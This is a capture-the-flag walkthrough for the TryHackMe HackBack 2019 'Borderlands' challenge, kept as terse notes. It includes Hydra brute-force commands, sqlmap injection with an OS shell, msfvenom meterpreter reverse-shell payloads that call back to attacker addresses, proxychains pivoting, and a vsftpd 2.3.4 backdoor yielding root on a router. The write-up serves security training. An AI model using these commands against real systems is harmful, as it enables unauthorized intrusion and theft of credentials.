---
title: TryHackMe - HackBack 2
layout: post
description: A write up of the TryHackMe HackBack 2019 2 University CTF
tags: ctf tryhackme
toc: true
---

# Task 4: Borderlands [Networking] [Insane]

## Question 2: What is the API key that fits the following pattern: "WEB*"

Ennumeate web directories with dirb

Get post data for login form

Brute force login form with Hydra

hydra -I -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt 10.10.221.98 http-post-form "/:username=^USER^&password=^PASS^:F=bad username"

billg:potato

## Question 4: What is the flag in the /var/www directory of the web app host? {FLAG:Webapp:XXX}

API uses SQL, use SQL map to check for injection

sqlmap --random-agent -u "http://10.10.221.98/api.php?documentid=2&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD" -p documentid

Pop a shell using --os-shell

Use msfvenom to generate meterpreter for better shell

msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.8.0.125 -f elf -o shell

Drop using sqlmap file stager

msfconsole

Set up handler

Run reverse shell from SQLMap shell

cat flag

## Question 1: What is the API key that fits the following pattern: "AND*"

Decompile APK using APKTool

Check source code for activies

MainActivity open Main2Activity

MainActivity2 references api.php and a string resource that is decrypted by an unimplemented function that uses another string as a key

<string name="encrypted_api_key">CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo</string>

Doesn't look encoded

Probably a fairly basic cipher as no hints to implementation are given

We know it starts with "AND"

Cannot be caeser cipher - distance from C-A and B-N is difference

Potentially Vigenère cipher

Now we have access to the web server we can look at api.php to see how the API keys are checked

if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtC"))
{
    die("Invalid API key");
}

Doesn't give us full key but gives us a very big crib, if we use until the first number(numbers can't be part of key), should reveal the key

CONTEXTCONT5U8YGG2tlQQSvYi2mNt

Context seems like a sane key

ANDVOWLDLAS5Q8OQZ2tuIPGcOu2mXk

Could guess this from context ;) and just the crib of "AND" revealing "CON"

## Question 3: What is the API key that fits the following pattern: "GIT*"

Could be done through directory discovery but much easier once you have web server access.

https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/

Instead:
metepreter> download .git

Files will be in the working directory you opened msfconsole from

Move .git to new folder

git checkout -- .

git log

Shows commit history

commit b2f776a52fe81a731c6c0fa896e7f9548aafceab
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:41:00 2019 +0100

    removed sensitive data

Looks like what we're looking for

git revert b2f776a52fe81a731c6c0fa896e7f9548aafceab

if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtCotiTZpf0HC"))
{
    die("Invalid API key");
}

Has full API key: 

b2f776a52fe81a731c6c0fa896e7f9548aafceab


## Question 5: What is the flag in the /root/ directory of router1? {FLAG:Router1:XXX}

Need more tools - limited tools on machine - no ping, dig, wget.

Need nmap for host discovery

Binaries must be self contained as there isn't much on this server and we don't have packet manager access

https://github.com/ernw/static-toolbox

https://insinuator.net/2018/02/creating-static-binaries-for-nmap-socat-and-other-tools/

https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox

Drop onto machine using meterpreter - larger file limit

We know we can reach a router of some sort from this box

shell

ip addr

Two interfaces 172.18.0.0/16 172.16.1.0/24

./nmap -sP 172.16.1.0/24 172.18.0.0/16 for host discovery


172.18.0.1 looks like the aws host
172.18.0.2 is us

172.16.1.10 is us
172.16.1.128 is hackback_router1_1.hackback_r_1_ext which sounds like what we're trying to get to

./nmap -p- 172.16.1.128

Starting Nmap 7.11 ( https://nmap.org ) at 2019-10-28 00:47 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for hackback_router1_1.hackback_r_1_ext (172.16.1.128)
Host is up (0.00014s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
179/tcp  open  bgp
2601/tcp open  zebra
2605/tcp open  bgpd

Nmap done: 1 IP address (1 host up) scanned in 1.84 seconds

This version of nmap doesn't have scripts, so I used the nmaps socks proxy for routing and the kali's nmap for service ennumeration - ennumeration is everything

ctrl+c to close shell
ctrl+z to background session

use auxiliary/server/socks4a 

run



Add route to metasploit through session

route add 172.16.1.0 255.255.255.0 2

nano /etc/proxychains.conf
socks4  127.0.0.1 1080





proxychains nmap 172.16.1.128 -Pn -sT -sV -p 21,179,2601,2605

(-A can break the tunnel)

(can break the tunnel not sure why)

proxychains nmap 172.16.1.128 -Pn -sT -sV  -p 21,179,2601,2605
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-28 01:00 GMT
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:21-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:2605-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:2601-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:179-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:21-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:179-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:2601-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:2605-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.128:179-<><>-OK
Nmap scan report for 172.16.1.128
Host is up (0.057s latency).

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.3.4
179/tcp  open  tcpwrapped
2601/tcp open  quagga     Quagga routing software 1.2.4 (Derivative of GNU Zebra)
2605/tcp open  quagga     Quagga routing software 1.2.4 (Derivative of GNU Zebra)
Service Info: OS: Unix

clearly a router

vsftpd 2.3.4 has a backdoor in it that we can exploit

./busybox telnet 172.16.1.128 21
220 (vsFTPd 2.3.4)
USER user:)
331 Please specify the password.
PASS pass
^]e

./nmap -p- 172.16.1.128

Starting Nmap 7.11 ( https://nmap.org ) at 2019-10-28 01:04 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for hackback_router1_1.hackback_r_1_ext (172.16.1.128)
Host is up (0.00014s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
179/tcp  open  bgp
2601/tcp open  zebra
2605/tcp open  bgpd
6200/tcp open  unknown

The back door is on port 6200 - looks like it's successful (nmap can close the backdoor however - needs reopened)

./busybox telnet 172.16.1.128 6200 
whoami;
root
: not found


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.72 seconds

cat /root/flag.txt;
{FLAG:Router1:c877f00ce2b886446395150589166dcd}
: not found



## Question 6: What flag is transmitted from flag_server to flag_client over UDP? {FLAG:UDP:XXX}

Meterpreter can act as a listener for msfconsole, this shell is unreliale and limited so lets drop a meterpeter here too for stability

msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=172.16.1.10 -f elf -o shell

upload using meterpreter to web app machine

download using wget on router

set up listener to use 172.16.1.10

run handler

run reverse shell

Setup SSH

Fix SSH

BGP Poison

tcpdump

https://snowscan.io/htb-writeup-carrier/


## Question 7: What flag is transmitted from flag_server to flag_client over TCP? {FLAG:TCP:XXX}